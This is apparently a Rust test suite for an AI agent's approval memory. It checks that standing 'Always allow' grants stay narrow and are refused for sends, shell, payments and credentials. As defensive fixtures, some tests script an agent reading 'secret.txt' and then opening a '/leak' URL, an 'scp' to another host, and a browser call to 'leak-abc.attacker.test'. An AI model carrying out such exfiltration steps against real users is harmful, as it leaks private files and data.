//! Approval memory: a remembered rule covers one target and nothing wider.

#![allow(clippy::assert_is_empty)]

use std::sync::Arc;
use std::sync::atomic::Ordering;

use permission_engine::Policy;
use protocol::{Event, PermissionCategory, RunId};
use serde_json::json;
use task_runtime::RunState;
use tool_registry::{ContentClass, Effect};

use crate::scoped_grant::{Scope, ScopeKind};
use crate::tests::{
    Env, Fake, TestTool, calls, cfg, make_loop as make_loop_legacy, profile, setup, t, text, until,
    with_class,
};
use crate::{AgentLoop, ApprovalScope, GrantTarget, LoopError};

/// Strict loop: the real "Always allow" allow-list applies.
fn make_loop(
    storage: &Arc<storage::Storage>,
    bot: protocol::BotId,
    fake: &Arc<Fake>,
    tools: &[&Arc<TestTool>],
    prof: crate::BotProfile,
    config: crate::LoopConfig,
) -> AgentLoop {
    let lp = make_loop_legacy(storage, bot, fake, tools, prof, config);
    lp.sh
        .legacy_always
        .store(false, std::sync::atomic::Ordering::Relaxed);
    lp
}

const ASK: &str = "[permissions]\npreset = \"read-and-draft\"\n";

fn tool(name: &str, effect: Effect, category: PermissionCategory) -> Arc<TestTool> {
    Arc::new(with_class(
        name,
        effect,
        category,
        ContentClass::none(),
        "ok",
    ))
}

fn scoped(tool: &str, kind: ScopeKind, pattern: &str) -> GrantTarget {
    GrantTarget::Scoped {
        tool: tool.to_owned(),
        scope: Scope {
            kind,
            pattern: pattern.to_owned(),
        },
    }
}

/// Start a turn, wait for its approval card and answer it with `scope`.
async fn approve(env: &Env, lp: &AgentLoop, scope: ApprovalScope) -> RunId {
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let Event::ApprovalNeeded(card) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    lp.approve(card.call_id, scope, env.user).unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    run
}

/// Start a turn and report whether it asked (a call that does not ask runs to the end).
async fn asks(env: &Env, lp: &AgentLoop) -> bool {
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let done = lp.wait(run);
    tokio::pin!(done);
    tokio::select! {
        _ = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))) => {
            lp.cancel(run).unwrap();
            let _ = done.await;
            true
        }
        state = &mut done => {
            assert_eq!(state.unwrap(), RunState::Succeeded);
            false
        }
    }
}

/// Offer and acceptance of "Always allow" for one pending call; the loop is then cancelled.
async fn always_is_refused(
    name: &str,
    effect: Effect,
    cat: PermissionCategory,
    input: serde_json::Value,
) {
    let env = setup();
    let t_tool = tool(name, effect, cat);
    let fake = Fake::new(vec![calls(&[("c1", name, input)]), text("ok")]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&t_tool)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let Event::ApprovalNeeded(card) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    assert_eq!(
        card.details.as_ref().unwrap()["always_offered"],
        false,
        "{name} must not show Always"
    );
    assert!(
        matches!(
            lp.approve(card.call_id, ApprovalScope::Always, env.user),
            Err(LoopError::OnceOnly(_))
        ),
        "{name} must refuse Always"
    );
    lp.cancel(run).unwrap();
    let _ = lp.wait(run).await;
    assert!(lp.list_grants(env.bot).is_empty(), "{name}");
}

/// "Always allow" is an allow-list: sends, writes, shell and MCP / Composio tools of any
/// name are refused, however innocent the name looks.
#[tokio::test]
async fn always_allow_is_refused_for_sends_writes_shell_and_innocently_named_tools() {
    let msg = PermissionCategory::Messaging;
    for (name, effect, cat, input) in [
        ("email_send", Effect::Write, msg, json!({"to": "a@b.test"})),
        ("send_message", Effect::Write, msg, json!({"text": "hi"})),
        (
            "fs_write",
            Effect::Write,
            PermissionCategory::Fs,
            json!({"path": "docs/a.md"}),
        ),
        (
            "shell_run",
            Effect::Destructive,
            PermissionCategory::Shell,
            json!({"command": "npm publish"}),
        ),
        (
            "shell_run",
            Effect::Destructive,
            PermissionCategory::Shell,
            json!({"command": "git push"}),
        ),
        (
            "shell_run",
            Effect::Destructive,
            PermissionCategory::Shell,
            json!({"command": "scp a.txt host:/tmp"}),
        ),
        (
            "composio/GMAIL_SEND_EMAIL",
            Effect::Write,
            msg,
            json!({"to": "a@b.test"}),
        ),
    ] {
        always_is_refused(name, effect, cat, input).await;
    }
}

/// Approving one `shell_interactive` call "for this chat" must not unlock the tool for the rest
/// of the chat: `start` and `write` of any command would follow. The card is once-only, every
/// standing scope is refused, and the next call asks again.
#[tokio::test]
async fn an_interactive_shell_call_is_approved_once_and_never_for_the_chat() {
    let env = setup();
    let shell = tool(
        "shell_interactive",
        Effect::Destructive,
        PermissionCategory::Shell,
    );
    let start = json!({"action": "start", "command": "vibe --setup"});
    let write = json!({"action": "write", "session": "pty-1", "input": "yes", "enter": true});
    let fake = Fake::new(vec![
        calls(&[("c1", "shell_interactive", start.clone())]),
        text("ok"),
        // Each of these asks and is cancelled, so no text answer follows.
        calls(&[("c2", "shell_interactive", write)]),
        calls(&[("c3", "shell_interactive", start)]),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&shell)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let Event::ApprovalNeeded(card) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    let details = card.details.clone().unwrap();
    assert_eq!(details["once_only"], true);
    assert_eq!(details["always_offered"], false);
    for scope in [
        ApprovalScope::ThisChat,
        ApprovalScope::Always,
        ApprovalScope::AlwaysCategory,
    ] {
        assert!(
            matches!(
                lp.approve(card.call_id, scope, env.user),
                Err(LoopError::OnceOnly(_))
            ),
            "{scope:?} must be refused"
        );
    }
    lp.approve(card.call_id, ApprovalScope::Once, env.user)
        .unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert!(lp.list_grants(env.bot).is_empty());
    // The `write` of the same chat asks too, and so does a second `start`.
    assert!(asks(&env, &lp).await, "write must ask again");
    assert!(asks(&env, &lp).await, "start must ask again");
}

/// A site grant is origin-exact, durable across a restart and revocable.
#[tokio::test]
async fn an_origin_grant_covers_that_origin_survives_restart_and_is_revocable() {
    let env = setup();
    let browser = tool("browser_open", Effect::Write, PermissionCategory::Browser);
    let urls = [
        "https://webioo.com.tr/a",
        "https://webioo.com.tr/b/c",
        "https://other.example/",
    ];
    let script = urls
        .iter()
        .enumerate()
        .flat_map(|(i, u)| {
            [
                calls(&[(&format!("c{i}"), "browser_open", json!({"url": u}))]),
                text("ok"),
            ]
        })
        .collect::<Vec<_>>();
    let fake = Fake::new(script);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&browser)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    approve(&env, &lp, ApprovalScope::Always).await;
    let rule = scoped(
        "browser_open",
        ScopeKind::Origin,
        "https://webioo.com.tr:443",
    );
    assert_eq!(
        lp.list_grants(env.bot)
            .iter()
            .map(|g| &g.target)
            .collect::<Vec<_>>(),
        vec![&rule]
    );
    assert!(
        !asks(&env, &lp).await,
        "the whole origin, by the owner's click"
    );
    assert!(asks(&env, &lp).await, "another origin asks");
    let fake2 = Fake::new(vec![]);
    let lp2 = make_loop(
        &env.storage,
        env.bot,
        &fake2,
        &[t(&browser)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    assert_eq!(lp2.list_grants(env.bot).len(), 1);
    assert!(lp2.revoke_grant(env.bot, &rule).unwrap());
    assert!(lp2.list_grants(env.bot).is_empty());
}

#[tokio::test]
async fn forgetting_a_deleted_bot_drops_its_standing_rules_and_only_its_own() {
    let env = setup();
    let fake = Fake::new(vec![]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let other = protocol::BotId::new();
    for bot in [env.bot, other] {
        lp.sh.grants.lock().always.push(crate::Grant {
            bot_id: bot,
            target: GrantTarget::Tool("web_search".into()),
            granted_at_ms: 0,
            computer: None,
            inert: false,
        });
    }
    assert_eq!(lp.count_standing_rules(env.bot), 1);
    lp.forget_bot(env.bot);
    assert_eq!(lp.count_standing_rules(env.bot), 0);
    assert!(lp.list_grants(env.bot).is_empty());
    assert_eq!(
        lp.list_grants(other).len(),
        1,
        "another bot keeps its rules"
    );
}

#[tokio::test]
async fn destructive_credential_and_payment_actions_refuse_always_allow() {
    for (name, effect, cat, input) in [
        (
            "fs_delete",
            Effect::Destructive,
            PermissionCategory::Fs,
            json!({"path": "notes.txt"}),
        ),
        (
            "email_send",
            Effect::Destructive,
            PermissionCategory::Messaging,
            json!({"to": "a@example.test", "body": "hi"}),
        ),
        (
            "pay_order",
            Effect::Write,
            PermissionCategory::Money,
            json!({"amount": 10}),
        ),
        (
            "account_login",
            Effect::Write,
            PermissionCategory::Accounts,
            json!({"user": "x"}),
        ),
    ] {
        let env = setup();
        let t_tool = tool(name, effect, cat);
        let fake = Fake::new(vec![calls(&[("c1", name, input)]), text("ok")]);
        let lp = make_loop(
            &env.storage,
            env.bot,
            &fake,
            &[t(&t_tool)],
            profile(ASK),
            cfg(Policy::approve_destructive()),
        );
        let mut rx = lp.subscribe();
        let run = lp.run_turn(env.chat, "go").unwrap();
        let Event::ApprovalNeeded(card) =
            until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
        else {
            unreachable!()
        };
        let details = card.details.clone().unwrap();
        assert_eq!(details["always_offered"], false, "{name}");
        assert!(
            matches!(
                lp.approve(card.call_id, ApprovalScope::Always, env.user),
                Err(LoopError::OnceOnly(_))
            ),
            "{name} must refuse Always"
        );
        lp.cancel(run).unwrap();
        let _ = lp.wait(run).await;
        assert!(lp.list_grants(env.bot).is_empty(), "{name}");
    }
}

#[tokio::test]
async fn browser_open_offers_always_allow_per_site_when_untrusted_only_not_after_private_read() {
    let env = setup();
    let page = Arc::new(with_class(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted(),
        "search results",
    ));
    let browser = Arc::new(with_class(
        "browser_open",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::declared(true, false, true),
        "opened",
    ));
    let priv_file = Arc::new(with_class(
        "fs_read",
        Effect::Read,
        PermissionCategory::Fs,
        ContentClass::private_read(),
        "secret",
    ));
    let fake = Fake::new(vec![
        calls(&[("c1", "web_search", json!({"query": "webioo"}))]),
        calls(&[(
            "c2",
            "browser_open",
            json!({"url": "https://webioo.com.tr/home"}),
        )]),
        calls(&[(
            "c3",
            "browser_open",
            json!({"url": "https://webioo.com.tr/docs"}),
        )]),
        calls(&[(
            "c4",
            "browser_open",
            json!({"url": "https://other.example/"}),
        )]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&browser), t(&priv_file)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "open webioo").unwrap();
    let Event::ApprovalNeeded(card) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    let details = card.details.clone().unwrap();
    assert_eq!(details["always_offered"], true);
    assert_eq!(details["memory"]["kind"], "origin");
    assert_eq!(details["memory"]["pattern"], "https://webioo.com.tr:443");
    lp.approve(card.call_id, ApprovalScope::Always, env.user)
        .unwrap();
    // Second call to same origin runs without asking; third call to another site asks.
    let Event::ApprovalNeeded(other) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    assert_eq!(other.input["url"], "https://other.example/");
    assert_eq!(browser.count.load(Ordering::SeqCst), 2);
    lp.cancel(run).unwrap();
    let _ = lp.wait(run).await;
}

#[tokio::test]
async fn browser_open_refuses_always_allow_after_private_read() {
    let page = Arc::new(with_class(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted(),
        "search results",
    ));
    let browser = Arc::new(with_class(
        "browser_open",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::declared(true, false, true),
        "opened",
    ));
    let priv_file = Arc::new(with_class(
        "fs_read",
        Effect::Read,
        PermissionCategory::Fs,
        ContentClass::private_read(),
        "secret",
    ));
    let env2 = setup();
    let fake2 = Fake::new(vec![
        calls(&[("p0", "web_search", json!({"query": "news"}))]),
        calls(&[("p1", "fs_read", json!({"path": "secret.txt"}))]),
        calls(&[(
            "p2",
            "browser_open",
            json!({"url": "https://other.example/leak"}),
        )]),
        text("done"),
    ]);
    let lp2 = make_loop(
        &env2.storage,
        env2.bot,
        &fake2,
        &[t(&page), t(&browser), t(&priv_file)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let mut rx2 = lp2.subscribe();
    let run2 = lp2.run_turn(env2.chat, "read then open").unwrap();
    let Event::ApprovalNeeded(priv_card) =
        until(&mut rx2, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    assert_eq!(priv_card.details.as_ref().unwrap()["always_offered"], false);
    assert!(matches!(
        lp2.approve(priv_card.call_id, ApprovalScope::Always, env2.user),
        Err(LoopError::OnceOnly(_))
    ));
    lp2.cancel(run2).unwrap();
    let _ = lp2.wait(run2).await;
}

/// The allow-list itself: the user's own computer, desktop input and unknown names never
/// qualify; an origin-scoped `browser_open` and a listed read-only tool do.
#[test]
fn the_always_allow_list_is_closed() {
    use crate::approval::always_allowed;
    let fs = PermissionCategory::Fs;
    assert!(!always_allowed(
        "pc_fs_write",
        Effect::Write,
        fs,
        false,
        false
    ));
    assert!(!always_allowed(
        "desktop_type",
        Effect::Write,
        PermissionCategory::Browser,
        false,
        false
    ));
    assert!(
        !always_allowed("fs_read", Effect::Write, fs, false, false),
        "a listed name is not enough, the effect must be a read"
    );
    assert!(!always_allowed(
        "browser_open",
        Effect::Read,
        PermissionCategory::Browser,
        false,
        false
    ));
    assert!(always_allowed(
        "browser_open",
        Effect::Read,
        PermissionCategory::Browser,
        true,
        false
    ));
    assert!(always_allowed("fs_read", Effect::Read, fs, false, false));
    // An MCP / Composio tool is refused whatever it is called and whatever it claims to do.
    for name in [
        "mcp:notes/sync_everything",
        "mcp:notes/read_note",
        "composio/GMAIL_SEND_EMAIL",
    ] {
        for effect in [Effect::Read, Effect::Write] {
            assert!(
                !always_allowed(name, effect, PermissionCategory::Browser, false, false),
                "{name}"
            );
        }
    }
}

/// A host is "allowed" (so its favicon may be fetched) only once the owner approved a
/// navigation to it: not while the card is pending, never when denied.
#[tokio::test]
async fn a_site_is_allowed_for_favicons_only_after_the_owner_approved_it() {
    let env = setup();
    let browser = tool("browser_open", Effect::Write, PermissionCategory::Browser);
    let fake = Fake::new(vec![
        calls(&[(
            "c1",
            "browser_open",
            json!({"url": "https://leak-abc.attacker.test/"}),
        )]),
        text("denied"),
        calls(&[(
            "c2",
            "browser_open",
            json!({"url": "https://webioo.com.tr/x"}),
        )]),
        text("ok"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&browser)],
        profile(ASK),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let Event::ApprovalNeeded(card) =
        until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await
    else {
        unreachable!()
    };
    assert!(!lp.site_allowed("leak-abc.attacker.test"), "pending card");
    lp.deny(card.call_id, env.user, None).unwrap();
    let _ = lp.wait(run).await;
    assert!(!lp.site_allowed("leak-abc.attacker.test"), "denied");
    assert!(!lp.site_allowed("webioo.com.tr"));
    approve(&env, &lp, ApprovalScope::Once).await;
    assert!(lp.site_allowed("webioo.com.tr"));
    assert!(lp.site_allowed("WEBIOO.com.tr."));
    assert!(!lp.site_allowed("other.webioo.com.tr"));
}
